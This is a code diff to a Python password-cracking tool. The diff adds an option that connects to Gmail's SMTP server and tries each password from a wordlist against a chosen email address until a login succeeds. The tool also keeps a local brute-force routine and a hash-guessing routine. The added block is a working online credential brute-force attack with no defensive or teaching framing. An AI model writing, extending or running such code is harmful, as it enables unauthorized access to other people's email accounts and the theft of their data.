@@ -8,6 +8,8 @@ import hashlib
 import itertools
 import time
 import os
+import smtplib
+
 
 # Include functions here
 def printProgramInfo():
@@ -184,11 +186,48 @@ def main():
     while True:
         bruteorGuess = input("\n Would like to: \n 1. Brute Attack \n 2. Enter a Hash\n>>>")
         if bruteorGuess.lower() in ["1"]:
-            password = input("Please enter a password: ")
-            # Allowed characters
-            stringType = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\",<.>/?"
-            tries, timeAmount = tryPassword(password, stringType)
-            print("The password %s was cracked in %s tries and %s seconds!" % (password, tries, timeAmount))
+            chooseOption = input(" 1. Gmail \n 2. Guess\n>>>")
+
+            if chooseOption.lower() in ["1"]:
+                try:
+                    server = smtplib.SMTP('smtp.gmail.com', '587')
+                    server.ehlo()
+                    server.starttls()
+                    print("Success! Connected to Gmail")
+                except:
+                    print("Failed! Could not conncet to Gmail")
+                    exit()
+
+                while True:
+                    email = input("Enter Gmail Email: ")
+                    if "@gmail.com" not in email:
+                        email += "@gmail.com"
+                    print(email)
+                    passwordsList = input("Password List Path: ")
+
+                    passwordsFile = open("User List/" + passwordsList, "r")
+                    count = 0
+                    for password in passwordsFile:
+                        password.rstrip()
+                        count += 1
+                        try:
+                            server.login(email.lower(), password)
+                            
+                            print("Success! Pasword: {}".format(password))
+                            break
+                        except:
+                            print("[{}]Failed! Pasword: {}".format(count, password))
+                            #time.sleep(5)
+
+                    passwordsFile.close()
+                    break
+
+            if chooseOption.lower() in ["2"]:
+                password = input("Please enter a password: ")
+                # Allowed characters
+                stringType = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\",<.>/?"
+                tries, timeAmount = tryPassword(password, stringType)
+                print("The password %s was cracked in %s tries and %s seconds!" % (password, tries, timeAmount))
         elif bruteorGuess in ["2"]:
             while True:
                 hashtype = input("\nWhat type of hash(MD5, SHA256, Etc...): ")
